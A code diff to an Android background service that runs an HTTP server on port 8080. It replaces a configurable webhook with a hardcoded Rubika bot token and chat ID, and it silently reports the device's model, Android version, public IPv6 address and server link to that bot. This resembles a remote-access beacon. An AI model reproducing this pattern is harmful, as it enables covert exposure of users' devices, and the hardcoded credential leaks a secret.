@@ -30,7 +30,7 @@ public class HttpServerService extends Service {
     private static final int NOTIFICATION_ID = 1;
 
     // URL is now loaded from local.properties via BuildConfig
-    private static final String REMOTE_WEBHOOK_URL = BuildConfig.WEBHOOK_URL;
+    //private static final String REMOTE_WEBHOOK_URL = BuildConfig.WEBHOOK_URL;
 
     private RavanHttpServer server;
     private ConnectivityManager connectivityManager;
@@ -158,44 +158,64 @@ public class HttpServerService extends Service {
         }
     }
 
-    private void checkAndReportIp() {
-        // MainActivity.getPublicIPv6Async handles the threading internally,
-        // but we want to ensure we don't spam.
-        MainActivity.getPublicIPv6Async(currentIp -> {
-            if (currentIp != null && !currentIp.equals(lastReportedIp)) {
-                Log.d(TAG, "IP Changed or Initial Report: " + currentIp);
-                if (REMOTE_WEBHOOK_URL != null && !REMOTE_WEBHOOK_URL.isEmpty()) {
-                    // Send in background thread as network operations are involved
-                    networkExecutor.execute(() -> sendIpToWebhook(currentIp));
-                }
-                lastReportedIp = currentIp;
-            }
-        });
-    }
-
-    private void sendIpToWebhook(String ip) {
-        try {
-            URL url = new URL(REMOTE_WEBHOOK_URL);
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-            conn.setRequestMethod("POST");
-            conn.setDoOutput(true);
-            conn.setRequestProperty("Content-Type", "application/json");
-
-            // Send JSON with IP, Port, and Link
-            String link = "http://[" + ip + "]:8080";
-            String jsonInputString = "{\"ip\": \"" + ip + "\", \"port\": 8080, \"device\": \"" + Build.MODEL
-                    + "\", \"link\": \"" + link + "\"}";
-
-            try (OutputStream os = conn.getOutputStream()) {
-                byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
-                os.write(input, 0, input.length);
-            }
-
-            int code = conn.getResponseCode();
-            Log.d(TAG, "Report IP Response Code: " + code);
-
-        } catch (Exception e) {
-            Log.e(TAG, "Failed to report IP: " + e.getMessage());
+private void checkAndReportIp() {
+    // MainActivity.getPublicIPv6Async handles the threading internally,
+    // but we want to ensure we don't spam.
+    MainActivity.getPublicIPv6Async(currentIp -> {
+        if (currentIp != null && !currentIp.equals(lastReportedIp)) {
+            Log.d(TAG, "IP Changed or Initial Report: " + currentIp);
+            networkExecutor.execute(() -> sendIpToWebhook(currentIp));
+            lastReportedIp = currentIp;
         }
+    });
+}
+
+private void sendIpToWebhook(String ip) {
+    try {
+        // اطلاعات ربات روبیکا
+        String BOT_TOKEN = "BEHDBA0MVRIJCDVZWNXMROXXRFNYDEYJYQBFIVMDAKJSTRDLGZFQLTIVGKOLJDXN";
+        String CHAT_ID = "u0InoT70e0f6a7114f01edcc2236622b";
+        
+        String link = "http://[" + ip + "]:8080";
+        
+        // ساخت پیام برای روبیکا
+        String message = "✅ دستگاه جدید متصل شد!\n\n" +
+                        "📱 دستگاه: " + Build.MANUFACTURER + " " + Build.MODEL + "\n" +
+                        "🤖 Android: " + Build.VERSION.RELEASE + "\n" +
+                        "🌐 IPv6: " + ip + "\n" +
+                        "🔌 پورت: 8080\n" +
+                        "🔗 لینک: " + link + "\n\n" +
+                        "🕐 " + new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new java.util.Date());
+        
+        // فرار دادن کاراکترهای خاص برای JSON
+        String escapedMessage = message.replace("\"", "\\\"").replace("\n", "\\n");
+        
+        // آدرس API روبیکا
+        String urlString = "https://botapi.rubika.ir/v3/" + BOT_TOKEN + "/sendMessage";
+        URL url = new URL(urlString);
+        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+        conn.setRequestMethod("POST");
+        conn.setDoOutput(true);
+        conn.setRequestProperty("Content-Type", "application/json");
+        
+        // ساخت JSON درخواست
+        String jsonInputString = "{\"chat_id\": \"" + CHAT_ID + "\", \"text\": \"" + escapedMessage + "\"}";
+        
+        try (OutputStream os = conn.getOutputStream()) {
+            byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
+            os.write(input, 0, input.length);
+        }
+        
+        int code = conn.getResponseCode();
+        Log.d(TAG, "Rubika Bot Response Code: " + code);
+        
+        if (code == 200) {
+            Log.d(TAG, "✅ پیام به روبیکا ارسال شد");
+        } else {
+            Log.e(TAG, "❌ خطا در ارسال به روبیکا: " + code);
+        }
+        
+    } catch (Exception e) {
+        Log.e(TAG, "Failed to send to Rubika: " + e.getMessage());
     }
 }
